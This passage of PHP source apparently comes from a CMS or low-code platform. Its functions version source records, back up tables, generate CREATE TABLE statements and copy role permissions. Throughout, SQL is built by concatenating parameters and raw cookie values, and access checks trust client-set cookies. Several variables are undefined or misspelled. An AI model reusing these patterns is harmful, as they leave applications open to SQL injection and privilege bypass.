}//DESCRIB ():  END@()
function recsrcver($srccls,$srcid,$srcmd5,$srccn,$srcen,$extx){
  $sqla="srctype,srcid,srcmd5,verchi,veren,ext,CRTM,UPTM,CRTOR,OLMK,RIP,pubtime";
  $sqlb="'".$srccls."','".$srcid."','".$srcmd5."','".$srccn."','".$srcen."','".$extx."',now(),now(),'".$_COOKIE["uid"]."','".onlymark()."','".getip()."',now()";
  $xz=UX("insert into coode_srcversion(".$sqla.")values(".$sqlb.")");
  $zz=UX("update coode_funlist set vermd5=md5(funfull)");
  $zz=UX("update coode_phpcls set vermd5=md5(funfull)");
  $zz=UX("update coode_sitefile set vermd5=md5(filetext)");  
  return true;
}//DESCRIB ():  END@()
function difftabomk($tbnm,$stb){  
  $bakrst=SX("select tabolmk from ".$stb." where tabname='".$tbnm."'");
  $pretab=SX("select OLMK from ".$tbnm);  
  $totpre=countresult($pretab);  
  $fmx="";
  $fmy="";
  for ($i=0;$i<$totpre;$i++){
    if (anyvalue($pretab,"OLMK",$i)!=""){
     if (strpos($bakrst,anyvalue($pretab,"OLMK",$i))>0){
     }else{
      $fmx=$fmx." OLMK='".anyvalue($pretab,"OLMK",$i)."' or ";
     }
    }
  }
  if ($fmx!="" and $totpre>0){
    $fmy="(".substr($fmx,0,strlen($fmx)-3).")";
  }else{
    $fmy=" 1>0 ";
  }
  return $fmy;
}//DESCRIB ():  END@()
function formcrt($dbase,$otnm,$ntnm,$skeys,$farr=array()){
  if ($dbase==""){
    $dbase=glb();
  }
 $conn=mysql_connect(gl(),glu(),glp());
if ($otnm!="" and $skeys!=""){
 $trst=selecteds($conn,"information_schema","select TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME,ORDINAL_POSITION,COLUMN_DEFAULT,IS_NULLABLE,DATA_TYPE,CHARACTER_MAXIMUM_LENGTH,CHARACTER_OCTET_LENGTH,NUMERIC_PRECISION,NUMERIC_SCALE,CHARACTER_SET_NAME,COLLATION_NAME,COLUMN_TYPE,COLUMN_KEY,EXTRA,PRIVILEGES,COLUMN_COMMENT from COLUMNS where TABLE_SCHEMA='".$dbase."' and TABLE_NAME='".$otnm."' and 'x,".$skeys.",' like concat('%,',COLUMN_NAME,',%')","utf8","");
 $totrst=countresult($trst);
 $fmc="";
 $fmk="";
 $fmktp="";
 $fmik="";
 $fmjscon="";
  $tbdk="X/CRTM/UPTM/CRTOR/STATUS/OLMK/VRT/STCODE/PTOF/PRIME/RIP/SNO/OPRT/";
 for ($k=0;$k<$totrst;$k++){
   $sTABLE_CATALOG[$k]=anyvalue($trst,"TABLE_CATALOG",$k);
   $sTABLE_SCHEMA[$k]=anyvalue($trst,"TABLE_SCHEMA",$k);
   $sTABLE_NAME[$k]=anyvalue($trst,"TABLE_NAME",$k);
   $sCOLUMN_NAME[$k]=anyvalue($trst,"COLUMN_NAME",$k);
   $sORDINAL_POSITION[$k]=anyvalue($trst,"ORDINAL_POSITION",$k);
   $sCOLUMN_DEFAULT[$k]=anyvalue($trst,"COLUMN_DEFAULT",$k);
   $sIS_NULLABLE[$k]=anyvalue($trst,"IS_NULLABLE",$k);
   $sDATA_TYPE[$k]=anyvalue($trst,"DATA_TYPE",$k);
   $sCHARACTER_MAXIMUM_LENGTH[$k]=anyvalue($trst,"CHARACTER_MAXIMUM_LENGTH",$k);
   $sCHARACTER_OCTET_LENGTH[$k]=anyvalue($trst,"CHARACTER_OCTET_LENGTH",$k);
   $sNUMERIC_PRECISION[$k]=anyvalue($trst,"NUMERIC_PRECISION",$k);
   $sNUMERIC_SCALE[$k]=anyvalue($trst,"NUMERIC_SCALE",$k);
   $sCHARACTER_SET_NAME[$k]=anyvalue($trst,"CHARACTER_SET_NAME",$k);
   $sCOLLATION_NAME[$k]=anyvalue($trst,"COLLATION_NAME",$k);
   $sCOLUMN_TYPE[$k]=anyvalue($trst,"COLUMN_TYPE",$k);
   $sCOLUMN_KEY[$k]=anyvalue($trst,"COLUMN_KEY",$k);
   $sEXTRA[$k]=anyvalue($trst,"EXTRA",$k);
   $sPRIVILEGES[$k]=anyvalue($trst,"PRIVILEGES",$k);
   $sCOLUMN_COMMENT[$k]=anyvalue($trst,"COLUMN_COMMENT",$k);
   $somark[$k]=date('Ymdhis').getRandChar(6);
   if ($sCOLUMN_NAME[$k]=="SNO"){
   }else{
    $fmk=$fmk.$sCOLUMN_NAME[$k].",";
    if (strpos($tbdk,"/".$sCOLUMN_NAME[$k]."/")>0){
    }else{
      $fmik=$fmik.$sCOLUMN_NAME[$k].",";
    }
    if ($k<$totrst-1){
        if (strpos($tbdk,"/".$sCOLUMN_NAME[$k]."/")>0){
        }else{
         $fmik=$fmik.$sCOLUMN_NAME[$k].",";
         $fmjscon=$fmjscon."↓\"".$sCOLUMN_NAME[$k]."∵↓,".$sCOLUMN_NAME[$k].",↓\",↓,";
        }
    }else{
        if (strpos($tbdk,"/".$sCOLUMN_NAME[$k]."/")>0){
          $fmjscon=$fmjscon."↓\"tablename∵".$tnm."\"↓";
        }else{
          $fmik=$fmik.$sCOLUMN_NAME[$k].",";
          $fmjscon=$fmjscon."↓\"".$sCOLUMN_NAME[$k]."∵↓,".$sCOLUMN_NAME[$k].",↓\"↓";
        }
    }
    if ($k<$totrst-1){
     $fmktp=$fmktp.$sCOLUMN_NAME[$k].",↓↑,↑↓,";
     $fmjstp=$fmjstp."↓\"".$sCOLUMN_NAME[$k]."∵↓,".$sCOLUMN_NAME[$k].",↓\",↓,";
    }else{
      $fmktp=$fmktp.$sCOLUMN_NAME[$k];
      $fmjstp=$fmjstp."↓\"".$sCOLUMN_NAME[$k]."∵↓,".$sCOLUMN_NAME[$k].",↓\"↓";
    }
   }
  switch($sDATA_TYPE[$k]){
    case "int":
    if ($sCOLUMN_NAME[$k]=="SNO"){
      $fmc=$fmc.$sCOLUMN_NAME[$k]." int(11) NOT NULL AUTO_INCREMENT,";
    }else{
      $fmc=$fmc.$sCOLUMN_NAME[$k]." int(11) NOT NULL,";
    }
    break;
    case "decimal":
    $fmc=$fmc.$sCOLUMN_NAME[$k]." decimal(10,2) NOT NULL,";
    break;
    case "varchar":
    $fmc=$fmc.$sCOLUMN_NAME[$k]." varchar(".$sCHARACTER_MAXIMUM_LENGTH[$k].") NOT NULL,";
    break;
    case "text":
    $fmc=$fmc.$sCOLUMN_NAME[$k]." text NOT NULL,";
    break;
    case "longtext":
    $fmc=$fmc.$sCOLUMN_NAME[$k]." longtext NOT NULL,";
    break;
    case "date":
    $fmc=$fmc.$sCOLUMN_NAME[$k]." date NOT NULL,";
    break;
    case "datetime":
    $fmc=$fmc.$sCOLUMN_NAME[$k]." datetime NOT NULL,";
    break;    
    default:
   }  
 }
  $fmc=$fmc."PRIMARY KEY (SNO),";
  $fmk=killlaststr($fmk);
  $fmik=killlaststr($fmik);
  $fmktp="concat(↓↑↓,".$fmktp.",↓↑↓)";
  $fmjstp="concat(".$fmjstp.")";
  $btree=betrees($tnm);
  if ($btree==""){
    $fmc=killlaststr($fmc);
  }else{
    $fmc=$fmc.$btree;
  }
  $crtsql="CREATE TABLE ".$ntnm." (".$fmc.") ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;";
  $farr["crtsql"]=$crtsql;
  $farr["allkey"]=$fmk;
  $farr["conkey"]=$fmik;
  $farr["keytps"]=$fmktp;
  $farr["jsontp"]=$fmjstp;
  $farr["jsoncon"]=$fmjscon;
}
  return $farr;
}//DESCRIB ():  END@()
function databak($dbase,$tbnm){
  if ($dbase==""){
    $dbase=glb();
  }
  //想办法搞成= 确定完成的备份，不能老用IN 计算量太大容易卡死
  $trst=SX("select createsql,keynames,keytpnms,jsontpnms,jsonconts,tabtitle,srckey,srcttk,contentkeys from coode_tablist where schm='".$dbase."' and TABLE_NAME='".$tbnm."'");
  $srck=anyvalue($trst,"srckey",0);
  $srctk=anyvalue($trst,"srcttk",0);
  if ($srck==""){
    $srck="VRT";
  }
  if ($srctk==""){
    $srctk="STCODE";
  }  
  $crts=anyvalue($trst,"createsql",0);
  $knms=anyvalue($trst,"keynames",0);
  $ktps=anyvalue($trst,"keytpnms",0);
  $ckeys=anyvalue($trst,"contentkeys",0);
  //concat(↓↑↓,OLMK,↓↑,↑↓,VRT,↓↑,↑↓,UPTM,↓↑,↑↓,CRTM,↓↑,↑↓,CRTOR,↓↑,↑↓,PTOF,↓↑,↑↓,schm,↓↑,↑↓,TABLE_NAME,↓↑,↑↓,createsql,↓↑,↑↓,keynames,↓↑,↑↓,keytpnms,↓↑,↑↓,jsontpnms,↓↑,↑↓,issys,↓↑,↑↓,ispmiss,↓↑,↑↓,tabtitle,↓↑,↑↓,tabcls,↓↑,↑↓,sysid,↓↑,↑↓,appid,↓↑,↑↓,usearea,↓↑,↑↓,affplot,↓↑,↑↓,STATUS,↓↑,↑↓,STCODE,↓↑,↑↓,PRIME,↓↑,↑↓,RIP,↓↑,↑↓,OPRT,↓↑↓)
  $ktps=str_replace("↓","'",$ktps);
  $ktps=str_replace("↑","\\"."'",$ktps);
  //↓"OLMK":"↓,OLMK,↓",↓,↓"VRT":"↓,VRT,↓",↓,↓"UPTM":"↓,UPTM,↓",↓,↓"CRTM":"↓,CRTM,↓",↓,↓"CRTOR":"↓,CRTOR,↓",↓,↓"PTOF":"↓,PTOF,↓",↓,↓"schm":"↓,schm,↓",↓,↓"TABLE_NAME":"↓,TABLE_NAME,↓",↓,↓"createsql":"↓,createsql,↓",↓,↓"keynames":"↓,keynames,↓",↓,↓"keytpnms":"↓,keytpnms,↓",↓,↓"jsontpnms":"↓,jsontpnms,↓",↓,↓"issys":"↓,issys,↓",↓,↓"ispmiss":"↓,ispmiss,↓",↓,↓"tabtitle":"↓,tabtitle,↓",↓,↓"tabcls":"↓,tabcls,↓",↓,↓"sysid":"↓,sysid,↓",↓,↓"appid":"↓,appid,↓",↓,↓"usearea":"↓,usearea,↓",↓,↓"affplot":"↓,affplot,↓",↓,↓"STATUS":"↓,STATUS,↓",↓,↓"STCODE":"↓,STCODE,↓",↓,↓"PRIME":"↓,PRIME,↓",↓,↓"RIP":"↓,RIP,↓",↓,↓"OPRT":"↓,OPRT,↓"↓
  $jstp=anyvalue($trst,"jsontpnms",0);
  $jstp=str_replace("↓","'",$jstp);
  $jstp=str_replace("∵","\":\"",$jstp);
  $jscons=anyvalue($trst,"jsonconts",0);  
  $jscons=str_replace("↓","'",$jscons);
  $jscons=str_replace("∵","\":\"",$jscons);
  
  if ($knms!="" and $ktps!="" and $jstp!="" and $tbnm!="" and $tbnm!="coode_databak"){
    $z=UX("insert into coode_databak(schm,tabname,tabsno,tabolmk,conjson,datajson,datasql,crttab,tabkeys,CRTM,UPTM,CRTOR,itemcrtm,itemuptm,itemcrtor,itemsrcid,itemsrcval,itemsrctt,itemsrctval,itemptof,conkeys)select '".$dbase."','".$tbnm."',SNO,OLMK,concat('{',".$jscons.",'}'),concat('{',".$jstp.",'}'),concat('(',".$ktps.",')'),'".$crts."','".$knms."',now(),now(),'".$_COOKIE["uid"]."',CRTM,UPTM,CRTOR,'".$srck."',".$srck.",'".$srctk."',".$srctk.",PTOF,'".$ckeys."' from ".$tbnm." where ".difftabomk($tbnm,"coode_databak"));        // where concat('".$tbnm."',OLMK) not in (select concat('".$tbnm."',tabolmk) from coode_databak)        
    $zzy=UX("update coode_databak set conjson=concat('〖',mid(conjson,3,length(conjson)-4),'〗') where mid(conjson,1,2)='{\"'");
    $zzy=UX("update coode_databak set conjson=replace(conjson,'\":\"','Ｔ')");
    $zzy=UX("update coode_databak set conjson=replace(conjson,'\",\"','Ｖ')");    
    
    $zzy=UX("update coode_databak set datajson=concat('〖',mid(datajson,3,length(datajson)-4),'〗') where mid(datajson,1,2)='{\"'");
    $zzy=UX("update coode_databak set datajson=replace(datajson,'\":\"','Ｔ')");
    $zzy=UX("update coode_databak set datajson=replace(datajson,'\",\"','Ｖ')");    
    
    $zzz=UX("update coode_databak set datasql=concat('〖',mid(datasql,3,length(datasql)-4),'〗') where mid(datasql,1,2)='(\''");
    $zzz=UX("update coode_databak set datasql=replace(datasql,'\',\'','∨')");
    
    $zzy=UX("update coode_databak set conjson=replace(conjson,'\"}〗','〗')");        
    $zzy=UX("update coode_databak set datajson=replace(datajson,'\"}〗','〗')");        
    $zzz=UX("update coode_databak set datasql=replace(datasql,'∨\')〗','∨〗')");
    
    $zzx=UX("update coode_databak set conmd5=md5(conjson),datamd5=md5(datasql),crtmd5=md5(crttab),keymd5=md5(frmsql),mymd5=md5(concat(tabname,tabolmk,datajson,datasql,crttab,frmsql,tabkeys))");
    
    $zkx=UX("update coode_databak set frmsql=concat('insert into ',tabname,'(',tabkeys,')values([DATA])')");
    
    $zstt=UX("update coode_databak SET STATUS=(length(replace(datasql,'∨','@:@'))-length(replace(datasql,'∨','@@')))-(length(tabkeys)-length(replace(tabkeys,',',''))),PRIME= (length(replace(datajson,'Ｖ','@:@'))-length(replace(datajson,'Ｖ','@@')))-(length(tabkeys)-length(replace(tabkeys,',',''))),VRT=(length(replace(datajson,'Ｔ','@:@'))-length(replace(datajson,'Ｔ','@@')))-(length(tabkeys)-length(replace(tabkeys,',',''))+1)");
    //":"= Ｔ  "," is Ｖ  datajson
    //',' is ∨     datasql
    return true;
  }else{
    return false;
  }
}//DESCRIB ():  END@()
function dataacc($dataareax,$ptofy,$cux){
  if (strpos($dataareax,",")>0){
    $ptdar=explode(",",$dataareax);
    $totptd=count($ptdar);
    $fmda=0;
    for ($da=0;$da<$totptd;$da++){
      if ($ptdar[$da]!=""){
        $fmda=$fmda+subpmt($ptofy,$cux,$ptdar[$da]);
      };
    };
    if ($fmda>0){
      return true;
    }else{
      return false;
    }
  }else{
    if ($dataareax!=""){
      if (subpmt($ptofy,$cux,$dataareax)==1){
        return true;
      }else{
        return false;
      }       
    }else{
      return false;
    }
  }
}//DESCRIB ():  END@()
function subpmt($ptofx,$cuid,$dary){
  switch($dary){
    case "DA:selfitem":
      if ($cuid==$_COOKIE["uid"]  and qian($ptofx,"/")==$_COOKIE["cid"]){
        return 1; 
      }else{
        return 0;
      }
    break;
    case "DA:selfpos":
      if (strpos("xx,".$_COOKIE["gid"].",",",".hou($ptofx,"@").",")>0 and qian($ptofx,"/")==$_COOKIE["cid"]){
         return 1; 
      }else{
         return 0; 
      }
    break;
    case "DA:sonpos":
        if (isparpos($_COOKIE["gid"],hou($ptofx,"@"))==true){
          return 1;
        }else{
         return 0; 
        }
    break ;
    case "DA:selfandsonpos":
      if (strpos("xx,".$_COOKIE["gid"].",",",".hou($ptofx,"@").",")>0 and qian($ptofx,"/")==$_COOKIE["cid"]){
         return 1; 
      }else{
        if (isparpos($_COOKIE["gid"],hou($ptofx,"@"))==true){
          return 1;
        }else{
          return 0; 
        }
      }
    break;
    case "DA:selfdepart":
      $infodpt=UX("select depart as result from coode_mypos where posid='".hou($ptofx,"@")."' and cid='".$_COOKIE["cid"]."'");
      $mydpts=atvs("(coode_mypos@cid='".$_COOKIE["cid"]."' and 'x,".$_COOKIE["gid"].",' like concat('%,',posid,',%').depart)");
      if (strpos("xx,".$mydpts.",",",".$infodtp.",")>0){
        return 1;
      }else{
        return 0;
      }
      //是否在自己的职位里所属的部门
    break;
    case "DA:sondepart":
      $infodpt=UX("select depart as result from coode_mypos where posid='".hou($ptofx,"@")."' and cid='".$_COOKIE["cid"]."'");
      $mydpts=atvs("(coode_mypos@cid='".$_COOKIE["cid"]."' and 'x,".$_COOKIE["gid"].",' like concat('%,',posid,',%').depart)");
      if (ispardpt($mydpts,$infodpt)==true){
        return 1;
      }else{
        return 0;
      }
    break;
    case "DA:selfandsondepart":
      $infodpt=UX("select depart as result from coode_mypos where posid='".hou($ptofx,"@")."' and cid='".$_COOKIE["cid"]."'");
      $mydpts=atvs("(coode_mypos@cid='".$_COOKIE["cid"]."' and 'x,".$_COOKIE["gid"].",' like concat('%,',posid,',%').depart)");
      if (strpos("xx,".$mydpts.",",",".$infodtp.",")>0){
        return 1;
      }else{
        if (ispardpt($mydpts,$infodpt)==true){
          return 1;
        }else{
          return 0;
        }
      }
    break;
    case "DA:selfleaddepart":
      $infodpt=UX("select depart as result from coode_mypos where posid='".hou($ptofx,"@")."' and cid='".$_COOKIE["cid"]."'");
      $plm=UX("select polarman as result from coode_mygroup where gid='".$infodpt."' and cid='".$_COOKIE["cid"]."'");
      if (strpos("xx,".$_COOKIE["gid"].",",$plm)>0){
        return 1;
      }else{
        return 0;
      }
    break;
    case "DA:leadsondepart":
      $infodpt=UX("select depart as result from coode_mypos where posid='".hou($ptofx,"@")."' and cid='".$_COOKIE["cid"]."'");
      if (issondptld($infodpt)==true){
        return 1;
      }else{
        return 0;
      }
    break;
    case "DA:selfandsonleaddepart":
      $infodpt=UX("select depart as result from coode_mypos where posid='".hou($ptofx,"@")."' and cid='".$_COOKIE["cid"]."'");
      $plm=UX("select polarman as result from coode_mygroup where gid='".$infodpt."' and cid='".$_COOKIE["cid"]."'");
      if (strpos("xx,".$_COOKIE["gid"].",",$plm)>0){
        return 1;
      }else{
       if (issondptld($infodpt)==true){
        return 1;
       }else{
        return 0;
       }
      }
    break;
    case "DA:selfcom":
      if (qian($ptofx,"/")==$_COOKIE["cid"]){
        return 1;
      }else{
        return 0;
      }
     break;
    case "DA:selfgroup":
      if (strpos(qian($ptofx,"/"),grpcid())>0){
        return 1;
      }else{
        return 0;
      }
    break;      
    default:
    if ($dary*1>0){
      if (strpos($ptofx,"/".$dary."@")>0){
        return 1;
      }else{
        return 0;
      }
    }else{
      if (strpos($ptofx,"@".$dary)>0 or $dary==qian($ptofx,"/") ){//如果角色里有公司名后面，前面是职位名
        return 1;
      }else{
        return 0;
      }
    }//dary
  }//switch
}//DESCRIB ():  END@()
function plottomy($plid,$myid){
  $keysx="plotmark,CRTM,UPTM,level,myid,parid,oriid,mytitle,partitle,orititle,mymark,parmark,orimark,myurl,myclick,CRTOR,mydescrib,PRIME,OLMK,PTOF,VRT,STATUS,STCODE,RIP,OPRT";
  $valsx="'".$myid."',now(),now(),level,myid,parid,oriid,mytitle,partitle,orititle,mymark,parmark,orimark,myurl,myclick,CRTOR,mydescrib,PRIME,RAND()*100000000,PTOF,VRT,STATUS,STCODE,RIP,OPRT"; 
  if ($myid!="" and $plid!=""){
    $nx=UX("insert into coode_plotmydetail(".$keysx.")select ".$valsx." from coode_plotdetail where plotmark='".$plid."'");    
    $kx=UX("delete from coode_plotmydetail where plotmark='".$myid."' and concat(plotmark,mymark) not in(select concat('".$myid."',mymark) from coode_plotdetail where plotmark='".$plid."')");
    $sx=UX("update coode_plotdetail,coode_plotmydetail set coode_plotmydetail.level=coode_plotdetail.level,coode_plotmydetail.myid=coode_plotdetail.myid,coode_plotmydetail.parid=coode_plotdetail.parid,coode_plotmydetail.oriid=coode_plotdetail.oriid,coode_plotmydetail.mytitle=coode_plotdetail.mytitle,coode_plotmydetail.partitle=coode_plotdetail.partitle,coode_plotmydetail.orititle=coode_plotdetail.orititle,coode_plotmydetail.parmark=coode_plotdetail.parmark,coode_plotmydetail.orimark=coode_plotdetail.orimark,coode_plotmydetail.myurl=coode_plotdetail.myurl,coode_plotmydetail.myclick=coode_plotdetail.myclick,coode_plotmydetail.CRTOR=coode_plotdetail.CRTOR,coode_plotmydetail.mydescrib=coode_plotdetail.mydescrib,coode_plotmydetail.PRIME=coode_plotdetail.PRIME,coode_plotmydetail.OLMK=coode_plotdetail.OLMK,coode_plotmydetail.PTOF=coode_plotdetail.PTOF,coode_plotmydetail.VRT=coode_plotdetail.VRT,coode_plotmydetail.STATUS=coode_plotdetail.STATUS,coode_plotmydetail.STCODE=coode_plotdetail.STCODE,coode_plotmydetail.RIP=coode_plotdetail.RIP,coode_plotmydetail.OPRT=coode_plotdetail.OPRT where coode_plotmydetail.mymark=coode_plotdetail.mymark and coode_plotmydetail.plotmark='".$myid."' and coode_plotdetail.plotmark='".$plid."' ");
  }else{
  }
  return true;
}//DESCRIB ():  END@()
function topmiss($sysid,$grid,$muid,$cidx){     
  $pkeys="permid,permtitle,appid,compid,groupid,grpvalx,clientid,metcls,method,behiver,keyx,valx,dataarea,CRTM,UPTM,CRTOR,STATUS,OLMK,PTOF,VRT,STCODE,PRIME,RIP,OPRT,sysid";
  $pvals="permid,permtitle,appid,'".$cidx."',groupid,valx,'".$muid."',metcls,method,behiver,keyx,valx,dataarea,now(),now(),CRTOR,STATUS,OLMK,PTOF,VRT,STCODE,PRIME,'".getip()."',OPRT,sysid";
  if ($grid!="" and $muid!=""){
    $nx=UX("insert into coode_tpmtru(".$pkeys.")select ".$pvals." from coode_tpmtrole where groupid='".$grid."' and sysid='".$sysid."'");
    $kx=UX("delete from coode_tpmtru where sysid='".$sysid."' and groupid='".$grid."' and clientid='".$muid."' and concat(metcls,method,behiver) not in(select concat(metcls,method,behiver) from coode_tpmtrole where groupid='".$grid."')");
    $sx=UX("update coode_tpmtrole,coode_tpmtru set coode_tpmtru.permid=coode_tpmtrole.permid,coode_tpmtru.permtitle=coode_tpmtrole.permtitle,coode_tpmeru.appid=coode_tpmtrole.appid,coode_tpmtru.compid=coode_tpmtrole.compid,coode_tpmtru.grpvalx=coode_tpmtrole.valx,coode_tpmtru.keyx=coode_tpmtrole.keyx,coode_tpmtru.dataarea=coode_tpmtrole.dataarea,coode_tpmtru.STATUS=coode_tpmtrole.STATUS where coode_tpmtrole.sysidid=coode_tpmtru.sysidid and coode_tpmtrole.groupid=coode_tpmtru.groupid and concat(coode_tpmtrole.metcls,coode_tpmtrole.method,coode_tpmtrole.behiver)=concat(coode_tpmtru.metcls,coode_tpmtru.method,coode_tpmtru.behiver) and coode_tpmtru.clientid='".$muid."'");
    
   $sqlx="funid,shortid,shorty,valx,reurl,appid,sysid,scvid,starttime,endtime";
   $z=UX("insert into coode_fpmtru(".$sqlx.",comid,roleid,clientid,STATUS)select ".$sqlx.",'".$cidx."','".$grid."','".$muid."',valx from coode_fpmtrole where roleid='".$grid."' and sysid='".$sysid."' and comid='".$cidx."' and concat(funid,'".$cid."',roleid,'".$muid."') not in (select concat(funid,comid,roleid,clientid) from coode_fpmtru)");
   $zz=UX("update coode_fpmtru,coode_funlist set coode_fpmtru.pertitle=coode_funlist.funcname where coode_fpmtru.funid=replace(coode_funlist.funname,'()','') and coode_fpmtru.clientid='".$muid."'");

   $sqlx="pagemark,shortid,shorty,valx,reurl,appid,sysid,starttime,endtime";
   $z=UX("insert into coode_ppmtru(".$sqlx.",comid,roleid,clientid,STATUS)select ".$sqlx.",'".$cidx."','".$grid."','".$muid."',valx from coode_ppmtrole where roleid='".$grid."' and sysid='".$sysid."' and comid='".$cidx."'  and concat(pagemark,'".$cid."',roleid,'".$muid."') not in (select concat(pagemark,comid,roleid,clientid) from coode_ppmtru)");
   $zz=UX("update coode_ppmtru,coode_tiny set coode_ppmtru.pertitle=coode_tiny.tinytitle where coode_ppmtru.pagemark=coode_tiny.tinymark and coode_ppmtru.clientid='".$muid."'");
  }else{
  }
  return true;
}//DESCRIB ():  END@()
function makerolex($roleid){
   $sqlx="permid,permtitle,appid,grpvalx,clientid,metcls,method,behiver,valx,dataarea,sysid";
   $z=UX("insert into coode_tpmtrole(".$sqlx.",compid,groupid)select ".$sqlx.",'".$cid."','".$roleid."' from coode_tpmtsys where concat(permid,'".$cid."','DataMaster') not in (select concat(permid,compid,groupid) from coode_tpmtrole)");
   
   $sqlx="funid,clientid,shortid,shorty,valx,reurl,appid,sysid,scvid,starttime,endtime";
   $z=UX("insert into coode_fpmtrole(".$sqlx.",comid,roleid)select ".$sqlx.",'".$cid."','".$roleid."' from coode_fpmtsys where concat(funid,'".$cid."','DataMaster') not in (select concat(funid,comid,roleid) from coode_fpmtrole)");

   $sqlx="pagemark,clientid,shortid,shorty,valx,reurl,appid,sysid,starttime,endtime";
   $z=UX("insert into coode_ppmtrole(".$sqlx.",comid,roleid)select ".$sqlx.",'".$cid."','".$roleid."' from coode_ppmtsys where concat(pagemark,'".$cid."','DataMaster') not in (select concat(pagemark,comid,roleid) from coode_ppmtrole)");
}
function frompmiss($sysid,$grid,$cidx){     
  $uapps=UX("select uapps as result from coode_myrole where rid='".$grid."' and cid='".$cidx."'");
  $pkeys="permid,permtitle,appid,compid,groupid,grpvalx,clientid,metcls,method,behiver,keyx,valx,dataarea,CRTM,UPTM,CRTOR,STATUS,OLMK,PTOF,VRT,STCODE,PRIME,RIP,OPRT,sysid";
  $pvals="permid,permtitle,appid,'".$_COOKIE["cid"]."',groupid,grpvalx,clientid,metcls,method,behiver,keyx,valx,dataarea,now(),now(),CRTOR,STATUS,OLMK,PTOF,VRT,STCODE,PRIME,'".getip()."',OPRT,sysid";
  if ($grid!=""){
    $nx=UX("insert into coode_tpmtrole(".$pkeys.")select ".$pvals." from coode_tpmtsys where groupid='".$grid."' and sysid='".$sysid."' and ',,".$uapps.",' like concat ('%,',appid,',%')");
    $kx=UX("delete from coode_tpmtrole where groupid='".$grid."'  and clientid='".$muid."' and clientid='".$muid."' and concat(metcls,method,behiver) not in(select concat(metcls,method,behiver) from coode_tpmtsys where groupid='".$grid."')");
    $sx=UX("update coode_tpmtsys,coode_tpmtrole set coode_tpmtrole.permid=coode_tpmtsys.permid,coode_tpmtrole.permtitle=coode_tpmtsys.permtitle,coode_tpmeru.appid=coode_tpmtsys.appid,coode_tpmtrole.compid=coode_tpmtsys.compid,coode_tpmtrole.grpvalx=coode_tpmtsys.grpvalx,coode_tpmtrole.keyx=coode_tpmtsys.keyx,coode_tpmtrole.valx=coode_tpmtsys.valx,coode_tpmtrole.dataarea=coode_tpmtsys.dataarea,coode_tpmtrole.STATUS=coode_tpmtsys.STATUS where coode_tpmtsys.sysid=coode_tpmtrole.sysid and  coode_tpmtsys.groupid=coode_tpmtrole.groupid and concat(coode_tpmtsys.metcls,coode_tpmtsys.method,coode_tpmtsys.behiver)=concat(coode_tpmtrole.metcls,coode_tpmtrole.method,coode_tpmtrole.behiver)");
    $nx=UX("insert into coode_fpmtrole(".$pkeys.")select ".$pvals." from coode_fpmtsys where groupid='".$grid."' and sysid='".$sysid."' and ',,".$uapps.",' like concat ('%,',appid,',%')");
    $kx=UX("delete from coode_fpmtrole where groupid='".$grid."'  and clientid='".$muid."'  and concat(metcls,method,behiver) not in(select concat(metcls,method,behiver) from coode_fpmtsys where groupid='".$grid."')");
    $sx=UX("update coode_fpmtsys,coode_fpmtrole set coode_fpmtrole.permid=coode_fpmtsys.permid,coode_fpmtrole.permtitle=coode_fpmtsys.permtitle,coode_tpmeru.appid=coode_fpmtsys.appid,coode_fpmtrole.compid=coode_fpmtsys.compid,coode_fpmtrole.grpvalx=coode_fpmtsys.grpvalx,coode_fpmtrole.keyx=coode_fpmtsys.keyx,coode_fpmtrole.valx=coode_fpmtsys.valx,coode_fpmtrole.dataarea=coode_fpmtsys.dataarea,coode_fpmtrole.STATUS=coode_fpmtsys.STATUS where coode_fpmtsys.sysid=coode_fpmtrole.sysid and coode_fpmtsys.groupid=coode_fpmtrole.groupid and concat(coode_fpmtsys.metcls,coode_fpmtsys.method,coode_fpmtsys.behiver)=concat(coode_fpmtrole.metcls,coode_fpmtrole.method,coode_fpmtrole.behiver) ");
    $nx=UX("insert into coode_ppmtrole(".$pkeys.")select ".$pvals." from coode_ppmtsys where groupid='".$grid."' and sysid='".$sysid."' and ',,".$uapps.",' like concat ('%,',appid,',%')");
    $kx=UX("delete from coode_ppmtrole where groupid='".$grid."'  and clientid='".$muid."'  and concat(metcls,method,behiver) not in(select concat(metcls,method,behiver) from coode_ppmtsys where groupid='".$grid."')");
    $sx=UX("update coode_ppmtsys,coode_ppmtrole set coode_ppmtrole.permid=coode_ppmtsys.permid,coode_ppmtrole.permtitle=coode_ppmtsys.permtitle,coode_tpmeru.appid=coode_ppmtsys.appid,coode_ppmtrole.compid=coode_ppmtsys.compid,coode_ppmtrole.grpvalx=coode_ppmtsys.grpvalx,coode_ppmtrole.keyx=coode_ppmtsys.keyx,coode_ppmtrole.valx=coode_ppmtsys.valx,coode_ppmtrole.dataarea=coode_ppmtsys.dataarea,coode_ppmtrole.STATUS=coode_ppmtsys.STATUS where coode_ppmtsys.sysid=coode_ppmtrole.sysid and coode_ppmtsys.groupid=coode_ppmtrole.groupid and concat(coode_ppmtsys.metcls,coode_ppmtsys.method,coode_ppmtsys.behiver)=concat(coode_ppmtrole.metcls,coode_ppmtrole.method,coode_ppmtrole.behiver) ");
  }else{
  }
  return true;
}//DESCRIB ():  END@()
function myroleto($xrid,$muid,$cidx){  
  $rkeys="roleid,rid,roletitle,rolecls,STATUS,CRTM,UPTM,CRTOR,depart,polarman,posleader,subpolar,classfied,alapps,uapps,enabled,cid,PTOF,OLMK,VRT,STCODE,PRIME,RIP,OPRT";
  $rvals="roleid,rid,roletitle,rolecls,STATUS,now(),now(),'".$muid."',depart,'".$muid."',posleader,subpolar,classfied,alapps,uapps,enabled,cid,PTOF,OLMK,VRT,STCODE,PRIME,RIP,OPRT";
  if ($xrid!="" and $muid!=""){
    $nx=UX("insert into coode_psrole(".$rkeys.")select ".$rvals." from coode_myrole where rid='".$xrid."' and cid='".$cidx."'");
    $sx=UX("update coode_psrole,coode_myrole set coode_psrole.roletitle=coode_myrole.roletitle,coode_psrole.rolecls=coode_myrole.rolecls,coode_psrole.alapps=coode_myrole.alapps,coode_psrole.uapps=coode_myrole.uapps,coode_psrole.enabled=coode_myrole.enabled where coode_psrole.rid=coode_myrole.rid and coode_psrole.cid=coode_myrole.cid and coode_psrole.polarman='".$muid."'");
  }else{
  }
  return true;
}//DESCRIB ():  END@()
function addhaspmt($tbnm,$uid,$cid){
 if (haspmtoftab($tbnm,$uid,$cid)=="1"){
     return true;
 }else{
